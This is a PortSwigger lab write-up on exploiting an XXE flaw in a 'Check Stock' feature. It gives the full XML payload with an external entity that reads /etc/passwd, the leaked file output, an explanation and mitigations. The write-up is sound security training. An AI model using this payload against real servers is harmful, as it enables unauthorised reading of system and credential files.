# PortSwigger Lab Writeup

## Lab: Exploiting XXE Using External Entities to Retrieve Files – Apprentice

---

## Lab Overview

This lab demonstrates an XML External Entity (XXE) vulnerability in the **Check Stock** functionality.

The application accepts XML input and parses it without disabling external entity processing. This allows an attacker to define an external entity that references a local file on the server.

The objective is to exploit the XXE vulnerability to retrieve the contents of the `/etc/passwd` file.

---

## Objective

- Identify an XXE vulnerability
- Inject an external entity
- Read the contents of `/etc/passwd`

---

## Tools Used

- Burp Suite
- Web Browser

---

## Exploitation Steps

1. Navigate to any product page.

2. Click **Check Stock**.

3. Intercept the POST request using Burp Suite.

4. Modify the XML request by inserting the following DOCTYPE declaration between the XML declaration and the `stockCheck` element:

```xml
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

5. Replace the `productId` value with the external entity reference:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

6. Forward the request.

---

## Screenshots

### 1. Original XML Request
![Original Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_lab_1-2.png)

### 2. Modified XML with External Entity and Server Response
![Modified Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_lab_1-3.png)
![Result](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_lab_1-4.png)

---

## Result

The application processes the external entity and returns:

```
Invalid product ID:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

This confirms that arbitrary files can be read from the server.

---

## Vulnerability Explanation

This vulnerability occurs because the XML parser processes external entities supplied by user input.

### 1. XML Parsing Without Restrictions

The application accepts XML documents and allows custom `DOCTYPE` declarations.

### 2. External Entity Processing Enabled

The XML parser resolves external entities such as:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Instead of treating it as plain text, the parser loads the referenced file from the server.

### 3. Sensitive File Disclosure

The file contents replace the entity reference (`&xxe;`) before the application processes the XML.

As a result, attackers can read arbitrary files accessible by the server.

---

## Why the Attack Works

| Component | Effect |
|----------|--------|
| `<!DOCTYPE>` | Defines custom XML entities |
| `<!ENTITY>` | Creates an external entity |
| `SYSTEM` | References a local file |
| `file:///etc/passwd` | Reads a file from the server |
| `&xxe;` | Inserts the file contents into the XML document |

---

## Mitigation Techniques

### 1. Disable External Entity Processing

Configure the XML parser to disable DTDs and external entities.

---

### 2. Disable DOCTYPE Declarations

Reject XML documents containing:

```xml
<!DOCTYPE ...>
```

unless they are absolutely required.

---

### 3. Use Secure XML Parser Configuration

Enable secure processing features provided by the XML parser.

Examples include:

- Disable DTD processing
- Disable external entities
- Disable external DTD loading

---

### 4. Validate User Input

Accept only expected XML structures and reject unexpected elements or declarations.

---

### 5. Keep XML Libraries Updated

Use modern XML libraries that have secure defaults and receive regular security updates.

---

## Key Takeaways

- XXE vulnerabilities occur when XML parsers process external entities.
- Attackers can read sensitive files from the server.
- External entity processing should be disabled unless absolutely necessary.
- Secure XML parser configuration is the most effective defense against XXE attacks.

---

## Lab Status

Solved Successfully
